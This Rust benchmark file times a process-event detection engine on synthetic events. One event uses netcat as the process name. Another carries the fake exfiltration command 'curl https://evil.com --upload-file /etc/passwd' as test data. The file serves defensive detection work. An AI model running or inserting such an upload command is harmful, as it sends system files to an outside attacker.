use criterion::{Criterion, criterion_group, criterion_main};
use flying_ace_engine::{EcsRhaiEngine, ProcessEvent};
use std::hint::black_box;

fn new_engine() -> EcsRhaiEngine {
    EcsRhaiEngine::new_from_dir("rules")
}

fn base_event() -> ProcessEvent {
    ProcessEvent {
        timestamp: "2025-06-04T12:00:00Z".into(),
        process_name: String::new(),
        process_pid: 0,
        process_sid: 0,
        process_args: None,
        process_executable: None,
        process_ppid: None,
        process_pname: None,
        process_working_directory: None,
        user_name: None,
        user_id: None,
        event_category: String::new(),
        event_module: None,
        ecs_version: String::new(),
        host_name: None,
        host_id: None,
    }
}

fn bench_eval_suspicious_process(c: &mut Criterion) {
    let engine = new_engine();
    let mut event = base_event();
    event.process_name = "nc".into();
    event.process_pid = 1234;

    c.bench_function("eval_suspicious_process_50x", |b| {
        b.iter(|| {
            (0..50).fold(0, |acc, _| {
                let matched = engine.eval(black_box(&event));
                black_box(matched);
                acc + 1
            })
        });
    });
}

fn bench_curl_upload_file(c: &mut Criterion) {
    let engine = new_engine();
    let mut event = base_event();

    event.timestamp = "2025-06-04T12:06:00Z".into();
    event.process_name = "curl".into();
    event.process_pid = 5252;
    event.process_args = Some("curl https://evil.com --upload-file /etc/passwd".into());

    c.bench_function("eval_curl_upload_50x", |b| {
        b.iter(|| {
            (0..50).fold(0, |acc, _| {
                let matched = engine.eval(black_box(&event));
                black_box(matched);
                acc + 1
            })
        });
    });
}

criterion_group!(
    benches,
    bench_eval_suspicious_process,
    bench_curl_upload_file
);
criterion_main!(benches);
